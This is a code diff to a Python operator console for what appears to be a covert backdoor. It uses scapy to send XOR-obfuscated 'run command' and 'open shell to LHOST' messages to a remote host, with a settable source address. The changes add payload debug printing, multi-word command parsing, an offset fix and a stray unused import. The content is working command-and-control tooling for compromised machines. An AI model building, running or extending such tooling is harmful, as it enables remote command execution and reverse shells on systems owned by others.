@@ -1,3 +1,4 @@
+from pydoc import plain
 import scapy.all as scapy
 from prompt_toolkit import prompt
 from prompt_toolkit.history import FileHistory
@@ -236,6 +237,7 @@ def ready(params):
             elif user_cmd == "EXECUTE":
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
+                    print(plaintext)
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
@@ -271,6 +273,19 @@ def ready(params):
                     print_help("sub")
             else:
                 print_help("sub")
+        elif len(user_in) > 3:
+            user_cmd = user_in[0].upper()
+            op_1 = user_in[1].upper()
+
+            if user_cmd == "SET":
+                if op_1 == "COMMAND":
+                    op_2 = ""
+                    for i in range(2, len(user_in)):
+                        op_2 = op_2 + user_in[i] + " "
+                params[op_1] = op_2.strip(' ')
+                print_options(params)
+            else:
+                print_help("sub")
         elif len(user_in) == 0:
             continue
         else:
@@ -304,6 +319,8 @@ def verify(params):
 def execute(plaintext, params):
     encrypted = xor_encrypt(plaintext.encode(), 0x10)
 
+    print(encrypted.decode())
+
     if(params["TRANSPORT"] == "UDP"):
         scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
         scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
@@ -318,7 +335,7 @@ def execute(plaintext, params):
         encrypted, verbose=False)
 
     RHOST = params["RHOST"]
-    print(colored(f"[*] Sending {plaintext[7:]} --> {RHOST}\n", "green"))
+    print(colored(f"[*] Sending {plaintext[6:]} --> {RHOST}\n", "green"))
 
 if(__name__ == "__main__"):
     main()
